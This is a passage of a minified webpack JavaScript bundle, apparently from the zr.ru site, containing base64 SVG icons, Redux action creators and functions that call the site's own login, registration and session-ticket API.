(() => {
  "use strict";

  var localStoreTracker = {
    localStorageView: {},
    track: function () {
      this.localStorageView = JSON.parse(JSON.stringify(localStorage));
    },
    changes: function () {
      var changes = {};
      for (var key in localStorage) {
        if (this.localStorageView[key] !== localStorage[key]) {
          changes[key] = [this.localStorageView[key], localStorage[key]];
        }
      }
      this.track();
      return changes;
    }
  };
  var e,
    t,
    i = {
      7941: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCI+PHBhdGggZD0iTTE2LjY3IDBsMi44MyAyLjgyOS05LjMzOSA5LjE3NSA5LjMzOSA5LjE2N0wxNi42NyAyNCA0LjUgMTIuMDA0eiIgZmlsbD0iIzk3MDAwMCIvPjwvc3ZnPg==";
      },
      5040: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMSIgaGVpZ2h0PSIxMSIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CiAgPHBhdGggZD0ibS41LjUgOCA4bTAtOC04IDgiIHN0cm9rZT0iIzYxNjE2MSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+Cjwvc3ZnPgo=";
      },
      8386: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTE2IDBBMTYgMTYgMCAwIDAgMCAxNmMwIDguMiA2LjMgMTQuOCAxNCAxNlYyMGgtNHYtNGg0di0zYzAtNC43IDIuMi03IDYtNyAxLjggMCAzIC40IDMgLjRWMTBoLTIuNkMxOCAxMCAxOCAxMiAxOCAxMy44VjE2aDVsLTEgNGgtNHYxMmM3LjgtMSAxNC03LjggMTQtMTZBMTYgMTYgMCAwIDAgMTYgMFoiIGZpbGw9IiNCREJEQkQiLz48L3N2Zz4=";
      },
      3546: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOS4zIiBoZWlnaHQ9IjM1LjMiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwYXRoIGQ9Ik0xNy41IDM1LjNjLS40IDAtLjgtLjEtMS4xLS40bC0xNi0xNmMtLjYtLjYtLjYtMS41IDAtMi4xTDE2LjcuNGMuNi0uNiAxLjUtLjYgMi4xIDAgLjYuNi42IDEuNSAwIDIuMUwzLjYgMTcuOGwxNC45IDE0LjljLjYuNi42IDEuNSAwIDIuMS0uMi40LS42LjUtMSAuNXoiIHN0eWxlPSJmaWxsOiNmZmYiLz48L3N2Zz4=";
      },
      3374: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1NyA2MiI+PHBhdGggZD0iTTQzIDBIMTV2OUgwdjUzaDQxdi05aDE2VjEzTDQzIDBabTEgNCAxMCAxMEg0NFY0Wm0tNSA1NkgyVjExaDI0djEzaDEzdjM2Wk0yOCAyMlYxMmwxMCAxMEgyOFptMjcgMjlINDFWNDFoM3YtMmgtM3YtNGg3di0yaC03di00aDN2LTJoLTN2LTRoN3YtMmgtOEwyOCA5SDE3VjJoMjV2MTRoMTN2MzVaIiBmaWxsPSIjQ0RDRUQwIi8+PHBhdGggZD0iTTggMzVoMjB2Mkg4di0yWm0wIDEyaDIwdjJIOHYtMlptMC02aDI1djJIOHYtMlptMC0xMmgyNXYySDh2LTJaIiBmaWxsPSIjQ0RDRUQwIi8+PC9zdmc+";
      },
      8207: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIHN0eWxlPSJmaWxsOnJlZCIvPjxwYXRoIHN0eWxlPSJmaWxsOiNmZmYiIGQ9Ik0yMy4yIDE2IDEyLjYgOS44djEyLjR6Ii8+PC9zdmc+";
      },
      8482: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAzNiAzNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE4IDBDOC4wNzQ5NiAwIDAgOC4wNzQ5NiAwIDE4QzAgMjcuOTI1IDguMDc0OTYgMzYgMTggMzZDMjcuOTI1IDM2IDM2IDI3LjkyNSAzNiAxOEMzNiA4LjA3NDk2IDI3LjkyNSAwIDE4IDBaTTE4IDYuMjYwODdDMjEuMDI1NiA2LjI2MDg3IDIzLjQ3ODMgOC43MTM1NiAyMy40NzgzIDExLjczOTFDMjMuNDc4MyAxNC43NjQ3IDIxLjAyNTYgMTcuMjE3NCAxOCAxNy4yMTc0QzE0Ljk3NDQgMTcuMjE3NCAxMi41MjE3IDE0Ljc2NDcgMTIuNTIxNyAxMS43MzkxQzEyLjUyMTcgOC43MTM1NiAxNC45NzQ0IDYuMjYwODcgMTggNi4yNjA4N1pNMTggOS4zOTEzQzE3LjM3NzMgOS4zOTEzIDE2Ljc4MDEgOS42Mzg2NiAxNi4zMzk4IDEwLjA3OUMxNS44OTk1IDEwLjUxOTMgMTUuNjUyMiAxMS4xMTY0IDE1LjY1MjIgMTEuNzM5MUMxNS42NTIyIDEyLjM2MTggMTUuODk5NSAxMi45NTkgMTYuMzM5OCAxMy4zOTkzQzE2Ljc4MDEgMTMuODM5NiAxNy4zNzczIDE0LjA4NyAxOCAxNC4wODdDMTguNjIyNyAxNC4wODcgMTkuMjE5OSAxMy44Mzk2IDE5LjY2MDIgMTMuMzk5M0MyMC4xMDA1IDEyLjk1OSAyMC4zNDc4IDEyLjM2MTggMjAuMzQ3OCAxMS43MzkxQzIwLjM0NzggMTEuMTE2NCAyMC4xMDA1IDEwLjUxOTMgMTkuNjYwMiAxMC4wNzlDMTkuMjE5OSA5LjYzODY2IDE4LjYyMjcgOS4zOTEzIDE4IDkuMzkxM1pNMTMuMjIxOCAxOS4xNzdDMTMuNDgzMyAxOS4xNjk4IDEzLjc1NCAxOS4yMjc3IDE0LjAxMjEgMTkuMzYzNUMxNS4yMDMyIDE5Ljk5MTEgMTYuNTU5MiAyMC4zNDc4IDE4IDIwLjM0NzhDMTkuNDQwOCAyMC4zNDc4IDIwLjc5NjggMTkuOTkxMSAyMS45ODc5IDE5LjM2MzVDMjMuMDIwMiAxOC44MjAzIDI0LjI2MDkgMTkuNTE4IDI0LjI2MDkgMjAuNjg0MUMyNC4yNjA5IDIxLjMxMSAyMy45MTI0IDIxLjg4ODcgMjMuMzU2IDIyLjE3NkMyMi43MDE3IDIyLjUxMzMgMjIuMDA0IDIyLjc3NDggMjEuMjg2MyAyMi45ODYxTDIzLjgwMjMgMjUuNTAyQzI0LjQxMzUgMjYuMTEzMyAyNC40MTM1IDI3LjEwNDEgMjMuODAyMyAyNy43MTU0QzIzLjQ5NzEgMjguMDIxNCAyMy4wOTYzIDI4LjE3MzkgMjIuNjk1NyAyOC4xNzM5QzIyLjI5NSAyOC4xNzM5IDIxLjg5NDIgMjguMDIxNCAyMS41ODkgMjcuNzE1NEwxOCAyNC4xMjY0TDE0LjQxMSAyNy43MTU0QzEzLjgwMDYgMjguMzI2NiAxMi44MDgxIDI4LjMyNjYgMTIuMTk3NyAyNy43MTU0QzExLjU4NjUgMjcuMTA0MSAxMS41ODY1IDI2LjExMzMgMTIuMTk3NyAyNS41MDJMMTQuNzEzNyAyMi45ODYxQzEzLjk5NiAyMi43NzQ4IDEzLjI5ODMgMjIuNTE0OCAxMi42NDQgMjIuMTc3NUMxMi4wODc2IDIxLjg4OTUgMTEuNzM5MSAyMS4zMTEgMTEuNzM5MSAyMC42ODQxQzExLjczOTEgMTkuODA5NSAxMi40Mzc0IDE5LjE5ODYgMTMuMjIxOCAxOS4xNzdaIiBmaWxsPSIjQzRDNEM0Ii8+Cjwvc3ZnPgo=";
      },
      4471: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgNDI0IDQzNCI+PHBhdGggZD0iTTE2OS4zLjhDNzYuMS44LjcgNzYuMi43IDE2OS40Uzc2LjEgMzM4IDE2OS4zIDMzOCAzMzggMjYyLjcgMzM4IDE2OS40IDI2Mi42LjggMTY5LjMuOHptMCAyOTcuNmMtNzEuNCAwLTEyOS01Ny42LTEyOS0xMjlzNTcuNi0xMjkgMTI5LTEyOSAxMjkgNTcuNSAxMjkgMTI5YzAgNzEuNC01Ny41IDEyOS0xMjkgMTI5eiIgZmlsbD0iI2I1YjViNyIvPjxkZWZzPjxwYXRoIGlkPSJhIiBkPSJNMCAwaDQyNHY0MzRIMHoiLz48L2RlZnM+PGNsaXBQYXRoIGlkPSJiIj48dXNlIHhsaW5rOmhyZWY9IiNhIiBvdmVyZmxvdz0idmlzaWJsZSIvPjwvY2xpcFBhdGg+PHBhdGggY2xpcC1wYXRoPSJ1cmwoI2IpIiBmaWxsPSJub25lIiBzdHJva2U9IiNiNWI1YjciIHN0cm9rZS13aWR0aD0iNTkuNTI0IiBkPSJNMjcwLjUgMjgwLjVsMTMyIDEzMiIvPjwvc3ZnPg==";
      },
      7481: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAzNiAzNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0wIDE4QzAgMTMuMjI2MSAxLjg5NjQyIDguNjQ3NzMgNS4yNzIwOCA1LjI3MjA4QzguNjQ3NzMgMS44OTY0MiAxMy4yMjYxIDAgMTggMEMyMi43NzM5IDAgMjcuMzUyMyAxLjg5NjQyIDMwLjcyNzkgNS4yNzIwOEMzNC4xMDM2IDguNjQ3NzMgMzYgMTMuMjI2MSAzNiAxOEMzNiAyMi43NzM5IDM0LjEwMzYgMjcuMzUyMyAzMC43Mjc5IDMwLjcyNzlDMjcuMzUyMyAzNC4xMDM2IDIyLjc3MzkgMzYgMTggMzZDMTMuMjI2MSAzNiA4LjY0NzczIDM0LjEwMzYgNS4yNzIwOCAzMC43Mjc5QzEuODk2NDIgMjcuMzUyMyAwIDIyLjc3MzkgMCAxOFpNMjcuNTYyNSA3LjQyNUgyNy40NUMyMy43Njc2IDguOTA2NyAyMC4wOTI1IDEwLjQwNjcgMTYuNDI1IDExLjkyNUwxNC45NjI1IDEyLjZMMy4wMzc1IDE3LjU1TDkuNTYyNSAxOS44TDIzLjQgMTEuMzYyNUMyMy40IDExLjM2MjUgMjQuMDc1IDExLjAyNSAyNC4wNzUgMTEuNDc1QzI0LjA3NSAxMS40NzUgMjQuMTg3NSAxMS41ODc1IDIzLjczNzUgMTIuMDM3NUwxMi44MjUgMjIuMTYyNUwxMS45MjUgMjcuNDVMMTUuOTc1IDIzLjg1TDIyLjcyNSAyOC45MTI1QzIzLjA2MjUgMjkuMDI1IDIzLjE3NSAyOC45MTI1IDIzLjE3NSAyOC45MTI1TDIzLjI4NzUgMjguOEwyNy41NjI1IDcuNTM3NVY3LjQyNVoiIGZpbGw9IiNCREJEQkQiLz4KPC9zdmc+Cg==";
      },
      7788: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAzNiAzNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxLjg5OCAyNC4zNDVDMjIuNTA0IDI0LjA5NjUgMjMuMDE5NSAyMy43MTMyIDIzLjM2MzUgMjMuMTU5MUMyMy44MzQ3IDIyLjQwMSAyMy44NDExIDIxLjg3NDggMjMuMDY4OSAyMS4zMTQ1QzIyLjg2OTMgMjEuMTcwOCAyMi42NzE0IDIxLjAyNTIgMjIuNDczNSAyMC44Nzk2QzIyLjE2NjQgMjAuNjUzNyAyMS44NTk1IDIwLjQyNzkgMjEuNTQ2NyAyMC4yMDk0QzIwLjc2NCAxOS42NjE0IDE5LjkxNzIgMTkuNTY2MiAxOS4zMzIzIDIwLjUyNjNDMTkuMzA5MSAyMC41NjM3IDE5LjI3NjMgMjAuNTk2NiAxOS4yNDM5IDIwLjYyOTFDMTkuMjM1IDIwLjYzOCAxOS4yMjYyIDIwLjY0NjkgMTkuMjE3NiAyMC42NTU4QzE4LjkxODggMjAuOTY3NSAxOC41NTA2IDIxLjA0NjIgMTguMTYwNCAyMC44ODc4QzE2LjY3ODEgMjAuMjg3IDE1LjUzMjUgMTkuMzE4NiAxNC44NDI0IDE3Ljg3NThDMTQuNDM3NCAxNy4wMjc2IDE0LjU0ODkgMTYuNjAxOSAxNS4zMDk1IDE2LjAzODVDMTUuMzg0MiAxNS45ODM2IDE1LjQ1NjggMTUuOTI1NiAxNS41MjUxIDE1Ljg2MzRDMTUuODU4NiAxNS41NjQxIDE1Ljk0NyAxNS4yMDc4IDE1Ljc1MTMgMTQuODA0OUMxNS4zMDQyIDEzLjg4NzIgMTQuNzA5OCAxMy4wNjkgMTMuOTU4NyAxMi4zNjI2QzEzLjY4NzMgMTIuMTA2OCAxMy4zNjMzIDExLjk3OTQgMTIuOTk3MiAxMi4wNTkyQzEyLjAzOTkgMTIuMjY2MyAxMS4wOTIxIDEyLjk1MDkgMTEuMDY0NyAxNC4xNjc5QzExLjA3NCAxNC4yMjMgMTEuMDc5NyAxNC4yNzk1IDExLjA4NTQgMTQuMzM1OUMxMS4wOTcxIDE0LjQ1MjMgMTEuMTA4OCAxNC41Njg3IDExLjE1MiAxNC42NzM0QzExLjIzMTQgMTQuODY0NiAxMS4zMDgyIDE1LjA1NzQgMTEuMzg1IDE1LjI1MDJDMTEuNjEwNiAxNS44MTY0IDExLjgzNjQgMTYuMzgzMSAxMi4xMjgzIDE2LjkxNDdDMTQuMDI4MiAyMC4zNzMgMTYuOTAxMSAyMi43OCAyMC41NjYyIDI0LjMwNjdDMjEuMDAyOCAyNC40ODkgMjEuNDU1MiAyNC41MjczIDIxLjg5OCAyNC4zNDVaIiBmaWxsPSIjQkRCREJEIi8+CjxwYXRoIGQ9Ik0xOC4zNzgxIDEzLjI2NjhDMTguNTcxNyAxMy4yMzQ3IDE4Ljc2OTQgMTMuMjE5MiAxOC45NjYyIDEzLjIxOTJDMjAuOTA3MSAxMy4yMTkyIDIyLjQ4NjEgMTQuNzczOCAyMi40ODYxIDE2LjY4NThDMjIuNDg2MSAxNi44ODA1IDIyLjQ3MDMgMTcuMDc1MiAyMi40Mzc3IDE3LjI2MzdDMjIuMzgzIDE3LjU4NTggMjIuNjAzOSAxNy44OTAzIDIyLjkzMTEgMTcuOTQ1MkMyMi45NjQ4IDE3Ljk1MTUgMjIuOTk4NCAxNy45NTM1IDIzLjAzMSAxNy45NTM1QzIzLjMxOTMgMTcuOTUzNSAyMy41NzM5IDE3Ljc0ODQgMjMuNjIzMyAxNy40NTk1QzIzLjY2NjQgMTcuMjA1NyAyMy42ODg1IDE2Ljk0NDcgMjMuNjg4NSAxNi42ODQ3QzIzLjY4ODUgMTQuMTIxMyAyMS41Njk4IDEyLjAzNTMgMTguOTY2MiAxMi4wMzUzQzE4LjcwMzIgMTIuMDM1MyAxOC40MzgxIDEyLjA1NzEgMTguMTgwMyAxMi4wOTg1QzE3Ljg1MjEgMTIuMTUyNCAxNy42MzEyIDEyLjQ1NzkgMTcuNjg1OSAxMi43OEMxNy43NDA2IDEzLjEwMzIgMTguMDQ5OSAxMy4zMjE3IDE4LjM3ODEgMTMuMjY2OFoiIGZpbGw9IiNCREJEQkQiLz4KPHBhdGggZD0iTTIwLjk4MzkgMTcuNjU3M0MyMS4zMTUyIDE3LjY1NzMgMjEuNTg0NiAxNy4zOTIyIDIxLjU4NDYgMTcuMDY1OUMyMS41ODQ2IDE1LjQzNDYgMjAuMjM1OSAxNC4xMDY4IDE4LjU4MDEgMTQuMTA3OEMxOC4yNDg3IDE0LjEwNzggMTcuOTc5NCAxNC4zNzMgMTcuOTc5NCAxNC42OTkyQzE3Ljk3OTQgMTUuMDI1NSAxOC4yNDg3IDE1LjI5MDcgMTguNTgwMSAxNS4yOTA3QzE5LjU3NDIgMTUuMjkwNyAyMC4zODMyIDE2LjA4NzEgMjAuMzgzMiAxNy4wNjU5QzIwLjM4MzIgMTcuMzkyMiAyMC42NTI1IDE3LjY1NzMgMjAuOTgzOSAxNy42NTczWiIgZmlsbD0iI0JEQkRCRCIvPgo8cGF0aCBkPSJNMjUuMDQ0NSAxOC4yNDg3QzI1LjMyMDEgMTguMjQ4NyAyNS41Njc0IDE4LjA2MzMgMjUuNjMwNSAxNy43ODc4QzI1LjczNzggMTcuMzI0OCAyNS43OTI1IDE2Ljg0NjMgMjUuNzkyNSAxNi4zNjU3QzI1Ljc5MjUgMTIuODM2IDIyLjg3NTMgOS45NjM4NyAxOS4yOTAyIDkuOTYzODdDMTguODAyMSA5Ljk2Mzg3IDE4LjMxNiAxMC4wMTY3IDE3Ljg0NDggMTAuMTIzNEMxNy41MjA3IDEwLjE5NDggMTcuMzE3NyAxMC41MTE4IDE3LjM5MTQgMTAuODMwOEMxNy40NjM5IDExLjE0OTggMTcuNzg3OSAxMS4zNTA3IDE4LjEwOTkgMTEuMjc3MkMxOC40OTM4IDExLjE5MTIgMTguODg5NCAxMS4xNDc3IDE5LjI4ODEgMTEuMTQ3N0MyMi4yMTE1IDExLjE0NzcgMjQuNTg5IDEzLjQ4OTUgMjQuNTg5IDE2LjM2NjhDMjQuNTg5IDE2Ljc1ODMgMjQuNTQ0OCAxNy4xNDg4IDI0LjQ1NzUgMTcuNTI2OEMyNC4zODM5IDE3Ljg0NDggMjQuNTg2OSAxOC4xNjE3IDI0LjkxMDkgMTguMjM0MkMyNC45NTUxIDE4LjI0MzUgMjUuMDAwMyAxOC4yNDg3IDI1LjA0NDUgMTguMjQ4N1oiIGZpbGw9IiNCREJEQkQiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xOCAzNkMyNy45NDExIDM2IDM2IDI3Ljk0MTEgMzYgMThDMzYgOC4wNTg4OCAyNy45NDExIDAgMTggMEM4LjA1ODg4IDAgMCA4LjA1ODg4IDAgMThDMCAyNy45NDExIDguMDU4ODggMzYgMTggMzZaTTI2Ljc5OTIgOC44MTMxN0MyOC4wNDc5IDkuNjU5MzcgMjguODk5IDEwLjg1NTYgMjkuMzI5MyAxMi4zNjY4QzI5Ljk2MTUgMTQuNTkyNiAzMC4xNDQ1IDE3LjA1MzUgMjkuODg3OSAxOS44ODkzQzI5Ljc0MTYgMjEuNTAxOSAyOS4zNTAzIDIyLjkyNSAyOC42OTI4IDI0LjIzODRDMjguMDYyNyAyNS40OTY4IDI3LjAxMjggMjYuNDM1MiAyNS41NzQ3IDI3LjAyNjZDMjQuMDAzMSAyNy42NzE4IDIyLjMzNDYgMjcuODA4NSAyMC44OTQ1IDI3Ljg4NjJDMTkuNzA1NyAyNy45NDk0IDE4LjUwOTYgMjcuOTkzOSAxNy4zMzg4IDI4LjAxNjdDMTcuMjc0NCAyOC4wMTggMTcuMjM3IDI4LjAxODggMTcuMjA0MyAyOC4wMzE1QzE3LjE1OSAyOC4wNDkyIDE3LjEyMjYgMjguMDkwMSAxNy4wMzU4IDI4LjE4NzZMMTMuNjA5NSAzMS40Njg4QzEzLjQ0NTQgMzEuNjI2MiAxMy4yMjU1IDMxLjcxNDMgMTIuOTk2MiAzMS43MTQzQzEyLjUxMDEgMzEuNzE0MyAxMi4xMTY3IDMxLjMyNjkgMTIuMTE2NyAzMC44NDg0VjI3LjE5MjNDMTEuOTM0NyAyNy4xMTM2IDExLjcyNjQgMjcuMDM5IDExLjUwOTcgMjYuOTYzNEMxMS4wNzYzIDI2LjgxMjIgMTAuNjMwMyAyNi42NTU4IDEwLjI3OTkgMjYuNDM5M0M4LjkwODE2IDI1LjU5IDcuOTg0NTIgMjQuMjk2NCA3LjQ1NjQyIDIyLjQ4NjlDNi45MTM2IDIwLjYzMDkgNi43NDIxMyAxOC42Mjc4IDYuOTMxNDggMTYuMzY0N0M3LjAxMzU0IDE1LjM4NTkgNy4xNTQ1IDE0LjM1OTUgNy4zNjQ5IDEzLjIyNDRDNy43OTcyNiAxMC44ODU3IDkuMjEzMjMgOS4xNTgwNyAxMS41NzI4IDguMDkxMjdDMTIuNzc3NCA3LjU0NjQ3IDE0LjA5NjUgNy4yMDg4MiAxNS44NDkxIDYuOTk3NTNDMTcuNzE3NSA2Ljc3Mjc4IDE5LjY3OTQgNi44MTczMSAyMS44NDU0IDcuMTM1MjhDMjMuNDEwOCA3LjM2NTIyIDI1LjIyMzQgNy43NDQyOSAyNi43OTkyIDguODEzMTdaIiBmaWxsPSIjQkRCREJEIi8+Cjwvc3ZnPgo=";
      },
      568: (e, t, i) => {
        i.d(t, {
          Z: () => n
        }), i(7294);
        const n = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTE4IDEyLjVzMC0xLjUtMi0xLjVoLTJ2M2gyYzIgMCAyLTEuNSAyLTEuNVpNMTcgMTdoLTN2NGgzYzEuOCAwIDItMS40IDItMiAwLS45LS40LTItMi0yWk0xNiAwYTE2IDE2IDAgMSAwIDAgMzIgMTYgMTYgMCAwIDAgMC0zMlptMSAyNGgtN1Y4aDZjNCAwIDYgMSA2IDQgMCAyLTMgMy0zIDMgMyAwIDQgMiA0IDQgMCAzLTIgNS02IDVaIiBmaWxsPSIjQkRCREJEIi8+PC9zdmc+";
      },
      2876: (e, t, i) => {
        i.d(t, {
          Jb: () => o,
          aQ: () => a,
          au: () => r,
          FC: () => l,
          T: () => c,
          UF: () => y,
          Av: () => I,
          Ek: () => p,
          NZ: () => m,
          RZ: () => u,
          r0: () => x,
          lU: () => d,
          WM: () => N,
          K_: () => j,
          J: () => g,
          $l: () => h,
          hn: () => M,
          _1: () => s
        });
        var n = i(1757),
          r = (0, n.createAction)("FETCH_JSON_REQUEST", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          a = (0, n.createAction)("FETCH_JSON_RECEIVE", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          o = (0, n.createAction)("FETCH_JSON_FAIL", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          l = (0, n.createAction)("FETCH_NEXT_PAGE", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          c = (0, n.createAction)("FETCH_NEXT_PAGE_SUCCESS", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          s = (0, n.createAction)("VOTE_RECIEVE", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          M = (0, n.createAction)("VOTE_ERROR", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          d = (0, n.createAction)("SET_IS_ADBLOCK_ENABLED", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          g = (0, n.createAction)("@interface/SET_IS_SCROLLED_FIRST_TIME", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          u = (0, n.createAction)("FETCH_STORY_FEED_UPDATE_RECEIVE", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          m = (0, n.createAction)("FETCH_STORY_FEED_REQUEST", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          p = (0, n.createAction)("FETCH_STORY_FEED_RECEIVE", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          y = (0, n.createAction)("FETCH_NEXT_SECTION", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          I = (0, n.createAction)("FETCH_NEXT_SECTION_SUCCESS", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          N = (0, n.createAction)("SET_IS_AUTH_MODAL_OPEN", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          j = (0, n.createAction)("SET_IS_AUTH_PROCESSING", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          h = (0, n.createAction)("SET_USER_PROFILE", function (e) {
            return function (t) {
              return e(t);
            };
          }),
          x = (0, n.createAction)("GALLERY_IS_FULLSCREEN", function (e) {
            return function (t) {
              return e(t);
            };
          });
      },
      8608: (e, t, i) => {
        i.d(t, {
          $u: () => u,
          b_: () => M,
          xJ: () => p
        });
        var n = i(8926),
          r = i.n(n),
          a = i(7757),
          o = i.n(a),
          l = i(7563);
        function c(e) {
          return s.apply(this, arguments);
        }
        function s() {
          return (s = r()(o().mark(function e(t) {
            var i, n;
            return o().wrap(function (e) {
              for (;;) switch (e.prev = e.next) {
                case 0:
                  return e.next = 2, fetch("https://www.zr.ru/IMP-zr-users-api", {
                    method: "POST",
                    headers: {
                      "content-type": "application/x-www-form-urlencoded;charset=UTF-8"
                    },
                    body: l.stringify({
                      apiKey: "ef0f5128-d837-11e2-ab32-00ff8077ec56",
                      ticket: t
                    })
                  });
                case 2:
                  return i = e.sent, e.next = 5, i.json();
                case 5:
                  if (!(n = e.sent).content.main) {
                    e.next = 8;
                    break;
                  }
                  return e.abrupt("return", {
                    ok: !0,
                    result: n.content.main
                  });
                case 8:
                  return e.abrupt("return", {
                    ok: !1,
                    result: void 0
                  });
                case 9:
                case "end":
                  return e.stop();
              }
            }, e);
          }))).apply(this, arguments);
        }
        function M(e) {
          return d.apply(this, arguments);
        }
        function d() {
          return (d = r()(o().mark(function e(t) {
            var i, n, r;
            return o().wrap(function (e) {
              for (;;) switch (e.prev = e.next) {
                case 0:
                  return e.next = 2, fetch("https://api.zr.ru/passport/api/v1/remoting/request-ticket?format=json", {
                    method: "POST",
                    headers: {
                      "content-type": "application/x-www-form-urlencoded;charset=UTF-8"
                    },
                    body: l.stringify({
                      apiKey: "ef0f5128-d837-11e2-ab32-00ff8077ec56",
                      sid: t
                    })
                  });
                case 2:
                  return i = e.sent, e.next = 5, i.json();
                case 5:
                  return n = e.sent, e.next = 8, c(n.result.ticket);
                case 8:
                  return r = e.sent, e.abrupt("return", r);
                case 10:
                case "end":
                  return e.stop();
              }
            }, e);
          }))).apply(this, arguments);
        }
        var g = i(6258);
        function u(e) {
          return m.apply(this, arguments);
        }
        function m() {
          return (m = r()(o().mark(function e(t) {
            var i, n, r, a, c;
            return o().wrap(function (e) {
              for (;;) switch (e.prev = e.next) {
                case 0:
                  return i = t.email, n = t.password, e.next = 3, fetch("https://api.zr.ru/passport/api/v1/authentication/login", {
                    method: "POST",
                    headers: {
                      "content-type": "application/x-www-form-urlencoded;charset=UTF-8"
                    },
                    body: l.stringify({
                      apiKey: "ef0f5128-d837-11e2-ab32-00ff8077ec56",
                      format: "json",
                      email: i,
                      password: n
                    })
                  });
                case 3:
                  return r = e.sent, e.next = 6, r.json();
                case 6:
                  if ((a = e.sent).success) {
                    e.next = 9;
                    break;
                  }
                  return e.abrupt("return", a);
                case 9:
                  return g.Z.set("global_sid", a.result.sid, {
                    expires: 365,
                    domaim: ".zr.ru"
                  }), window.localStorage.setItem("global_sid", a.result.sid), e.next = 13, M(a.result.sid);
                case 13:
                  return c = e.sent, e.abrupt("return", c);
                case 15:
                case "end":
                  return e.stop();
              }
            }, e);
          }))).apply(this, arguments);
        }
        function p(e) {
          return y.apply(this, arguments);
        }
        function y() {
          return (y = r()(o().mark(function e(t) {
            var i, n, r, a;
            return o().wrap(function (e) {
              for (;;) switch (e.prev = e.next) {
                case 0:
                  return i = t.email, n = t.password, e.next = 3, fetch("https://api.zr.ru/passport/api/v1/registration/index?format=json", {
                    method: "POST",
                    headers: {
                      "content-type": "application/x-www-form-urlencoded;charset=UTF-8"
                    },
                    body: l.stringify({
                      apiKey: "ef0f5128-d837-11e2-ab32-00ff8077ec56",
                      email: i,
                      password: n,
                      autopassword: "yes"
                    })
                  });
                case 3:
                  return r = e.sent, e.next = 6, r.json();
                case 6:
                  return a = e.sent, e.abrupt("return", a);
                case 8:
                case "end":
                  return e.stop();
              }
            }, e);
          }))).apply(this, arguments);
        }
      },
      6552: (e, t, i) => {
        var n = i(7294),
          r = i(3935),
          a = i(2168),
          o = i(3727),
          l = i(5977),
          c = i(9115),
          s = i(6804),
          M = i(9065),
